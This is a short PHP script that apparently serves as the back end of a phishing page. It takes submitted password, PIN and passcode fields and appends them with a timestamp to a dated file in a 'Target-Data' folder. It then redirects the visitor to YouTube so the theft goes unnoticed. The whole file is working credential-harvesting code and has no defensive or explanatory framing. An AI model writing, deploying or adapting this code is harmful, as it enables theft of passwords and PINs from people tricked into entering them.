<?php
header("Location: https://www.youtube.com");
$receive_date = date("l, Y-m-d");
$save_date = date("Y-m-d");

if (!empty($_POST['passwd'])) {
file_put_contents("../../Target-Data/" . $save_date . "_PASSWDS.txt", $_POST['passwd'] . " || " . $receive_date, FILE_APPEND);
}
if (!empty($_POST['pin'])) {
file_put_contents("../../Target-Data/" . $save_date . "_PASSWDS.txt", $_POST['pin'] . " || " . $receive_date, FILE_APPEND);
}
if (!empty($_POST['passcode'])) {
file_put_contents("../../Target-Data/" . $save_date . "_PASSWDS.txt", "" . $_POST['passcode'] . " || " . $receive_date, FILE_APPEND);
}

exit();
?>